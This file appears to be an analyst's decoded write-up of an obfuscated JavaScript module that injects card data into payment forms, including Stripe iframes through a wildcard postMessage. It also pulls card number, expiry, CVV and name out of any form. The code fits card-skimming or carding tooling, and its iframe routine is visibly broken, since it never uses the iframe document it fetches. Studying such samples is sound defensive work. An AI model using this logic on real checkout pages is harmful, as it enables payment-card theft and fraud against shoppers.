/**
 * DECODED ANALYSIS: datainjector.js
 * 
 * This file handles data injection into payment forms.
 * 
 * OBFUSCATION TECHNIQUES USED:
 * 1. Custom base-91 encoding
 * 2. Variable name mangling
 * 3. Sequence expression wrappers
 * 
 * IDENTIFIED COMPONENTS:
 */

/**
 * DataInjector Module
 * -------------------
 * Handles injection of payment data into form fields
 */
const DataInjector = {
    /**
     * inject(formData, fieldSelectors)
     * ---------------------------------
     * Injects data into form fields
     * @param {Object} formData - Data to inject
     * @param {Object} fieldSelectors - Selectors for fields
     */
    inject: function(formData, fieldSelectors) {
        // Card number
        if (formData.cardNumber && fieldSelectors.cardNumber) {
            this.fillField(fieldSelectors.cardNumber, formData.cardNumber);
        }
        
        // Expiry
        if (formData.expiry && fieldSelectors.expiry) {
            this.fillField(fieldSelectors.expiry, formData.expiry);
        }
        
        // CVV
        if (formData.cvv && fieldSelectors.cvv) {
            this.fillField(fieldSelectors.cvv, formData.cvv);
        }
        
        // Name
        if (formData.name && fieldSelectors.name) {
            this.fillField(fieldSelectors.name, formData.name);
        }
    },

    /**
     * fillField(selector, value)
     * --------------------------
     * Fills a single form field
     */
    fillField: function(selector, value) {
        const element = document.querySelector(selector);
        if (!element) return false;
        
        // Set value
        element.value = value;
        
        // Trigger events
        element.dispatchEvent(new Event('input', { bubbles: true }));
        element.dispatchEvent(new Event('change', { bubbles: true }));
        element.dispatchEvent(new Event('blur', { bubbles: true }));
        
        return true;
    },

    /**
     * injectIntoIframe(iframe, formData)
     * ----------------------------------
     * Injects data into Stripe iframe
     */
    injectIntoIframe: function(iframe, formData) {
        try {
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            // Fill iframe fields
            this.inject(formData, {
                cardNumber: 'input[name="cardnumber"]',
                expiry: 'input[name="exp-date"]',
                cvv: 'input[name="cvc"]'
            });
        } catch (e) {
            // Cross-origin iframe - use postMessage
            iframe.contentWindow.postMessage({
                type: 'st_inject',
                data: formData
            }, '*');
        }
    },

    /**
     * extractData(form)
     * -----------------
     * Extracts payment data from form
     */
    extractData: function(form) {
        return {
            cardNumber: form.querySelector('[name*="card"]')?.value,
            expiry: form.querySelector('[name*="exp"]')?.value,
            cvv: form.querySelector('[name*="cv"]')?.value,
            name: form.querySelector('[name*="name"]')?.value
        };
    }
};

/**
 * Window Export
 * -------------
 */
window.DataInjector = DataInjector;
